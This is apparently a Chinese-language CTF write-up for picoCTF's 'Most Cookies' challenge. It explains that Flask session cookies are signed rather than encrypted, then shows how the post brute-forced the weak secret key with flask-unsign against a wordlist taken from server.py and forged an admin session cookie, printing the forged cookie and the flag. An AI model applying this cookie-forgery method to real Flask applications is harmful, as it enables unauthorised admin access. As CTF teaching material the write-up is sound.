---
icon: pen-to-square
date: 2024-12-20
tags: 
title: Most Cookies
category:
  - 领域
---
# Most cookies
Author: madStacks
#### Description
Alright, enough of using my own encryption. Flask session cookies should be plenty secure! [server.py](https://mercury.picoctf.net/static/c135543530f7dc24c3a6ecaeb44a81b8/server.py) [http://mercury.picoctf.net:65344/](http://mercury.picoctf.net:65344/)

#### Hints 
How secure is a flask cookie?

----
# 00. 前言
## 0x1. Flask
flask是Python编写的轻量级web应用框架
### Flask会话管理机制
flask框架下的cookie是这样的结构
```
eyJ2ZXJ5X2F1dGgiOiJibGFuayJ9.Z2Uskg.uziKYJ0zcZE4j4toa_S8dqE_auA
```
但是不重要，base64解码后可以看到我们的信息
```
{"very_auth":"blank"}ge,3&	S7x6qZj`
```
### 通过查资料发现
Flask框架加密cookie用的是签名机制而非加密机制
**这意味着，我们可以查看cookie的序列化内容，只是不能随意更改**
*因为在服务端的Flask框架中进行签名*
通过研究，Flask在服务端设置签名密钥是设置一个secret_key，用于加密和解密cookie的会话数据
示例：
```
from flask import Flask

app = Flask(__name__)
app.secret_key = 'your_secret_key'  # 设置密钥
```
*现在我们有思路了，我们只需要从python源代码获取secret，然后自己构造cookie就可以进行越权操作*
## 0x2. Flask-unsign
[Flask-Unsign](https://github.com/Paradoxis/Flask-Unsign)是一个专门用于爆破Flask框架加密cookie的工具，我们可以通过这个来爆出密码（一般需要提供字典），构造cookie。

# 02. 解题过程
## 2x1. 代码审计
首先对server.py文件进行代码审计，主要是secret_key的定义部分
![image.png](https://cdn.jsdelivr.net/gh/fakeppa/blog-img/20241220173823.png)
发现了逻辑是从这些明文里进行随机选择作为密钥（实际上经过测试发现，其实并不随机后面再说）
## 2x2. cookie构造
随后安装flask-unsign工具，
创建一个cookie.txt来存放密钥，内容为python代码中的cookie_name
```
snickerdoodle
chocolate chip
oatmeal raisin
gingersnap
shortbread
peanut butter
whoopie pie
sugar
molasses
kiss
biscotti
butter
spritz
snowball
drop
thumbprint
pinwheel
wafer
macaroon
fortune
crinkle
icebox
gingerbread
tassie
lebkuchen
macaron
black and white
white chocolate macadamia
```

### x2p1. 构造命令：
```
 flask-unsign -u --server http://mercury.picoctf.net:65344/ --wordlist cookie.txt
```
- -u：用爆破签名秘钥
- --server：指定提供cookie的服务器，也就是flask服务器
- --wordlist：指定字典
![image.png](https://cdn.jsdelivr.net/gh/fakeppa/blog-img/20241220174905.png)
发现密钥为fortun(无论重复多少次，密钥都为fortun,不知道是不是我的原因)

### x2p2. 构造cookie
```
flask-unsign --sign --cookie "{'very_auth':'admin'}" --secret 'fortune'
```
- --sign:构造cookie的指令，使用时需要指定secret
- --cookie：构造的有效载荷upload明文
- --secret：签名密钥
![image.png](https://cdn.jsdelivr.net/gh/fakeppa/blog-img/20241220175603.png)
```
eyJ2ZXJ5X2F1dGgiOiJhZG1pbiJ9.Z2U-0A.6uixHBNxbx7P6ZHeo-_dGFZjhd0
```

随后在网站的cookie进行更改，刷新后可得到flag
![image.png](https://cdn.jsdelivr.net/gh/fakeppa/blog-img/20241220175742.png)
*在这步尝试过使用其他密钥，但是都不能得到flag，真的很奇怪*

```
picoCTF{pwn_4ll_th3_cook1E5_25bdb6f6}
```


